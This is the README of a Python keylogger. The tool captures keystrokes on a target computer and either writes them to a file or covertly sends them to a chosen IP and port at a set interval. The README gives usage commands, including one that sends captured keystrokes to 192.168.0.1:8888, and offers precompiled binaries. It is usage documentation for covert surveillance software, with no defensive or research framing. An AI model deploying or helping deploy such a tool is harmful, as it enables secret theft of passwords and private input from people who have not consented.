# Python Key Logger
This is a variant of the well known tool referred to as a key-logger.
A key-logger is used to capture keystokes made on a target computer, and either covertly sending that data or storing it somewhere for retrieval.

This tool uses the python "keyboard" module, which requires root permissions on linux.

## How to use
This is an executable that can be ran of the command line, with two different modes: Manual or Prompt
Each mode has a different way to configure the target, port #, and reporting interval, the configurable parts of this program

### Manual
Run with "manual" or "m"

Requires the user to enter the target immediately after "manual/m" as a positional argument.
The port number can be entered following the flag -p or --port, but is only required if the target is a ip address.
The interval can be entered following the flag -i or --interval, but is not required. The default is 60 seconds.

--help output:
```
usage: keylogger.py manual [-h] [-p PORT] [-i INTERVAL] target

positional arguments:
  target                IP or filename

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  If IP is specified, target port #
  -i INTERVAL, --interval INTERVAL
                        Report interval, Default 1 minute
```

Example:
```
python keylogger.py m 192.168.0.1 -p 8888 -i 600
```

### Prompt
Run with "prompt" or "p"

The user will be prompted for the target, port, and interval by the running process.

Example:
```
python keylogger.py p
Target: 127.0.0.1
Port: 8888
Interval: 60
```

## What are the command line options? And what do they mean
- Target
- Port
- Interval

### Target
- Positional, Required

Either an IPv4 address, or a filename (the process will detect which one).
If it is a file, it will open the file if possible, and the file will remain open for the duration of the program. And will write captured keystrokes to that file.
If is is an ip address instead, it will make a connection every [interval](#Interval) seconds to report captured keystrokes. If it cannot open a connection, it will continue to capture keystrokes until it can.

### Port
- \-p
- \-\-port

This is required if [target](#Target) is an IP address, and it will be the target port to make a connection to.

### Interval
- \-i
- \-\-interval

This is the report interval, in seconds. Which determines how often the process will report captured keystrokes.

## Releases
In the "releases" directory, there will be binaries compiled with [PyInstaller](https://www.pyinstaller.org/).

The only current binary was compiled on a linux system, so it may only work for linux, but might work on any OS, 
I will add compiled binaries for windows and MacOS when I can.

